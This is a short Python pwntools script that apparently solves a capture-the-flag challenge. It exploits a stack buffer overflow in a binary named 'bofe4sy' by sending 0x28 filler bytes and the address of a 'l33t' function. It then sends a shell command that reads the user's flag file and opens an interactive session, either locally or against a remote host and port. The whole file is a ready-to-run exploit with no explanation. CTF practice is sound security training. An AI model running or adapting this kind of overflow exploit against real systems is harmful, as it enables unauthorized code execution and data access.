#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './bofe4sy'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2121

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

r.sendline(b'A'*0x28 + p64(e.symbols['l33t']))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
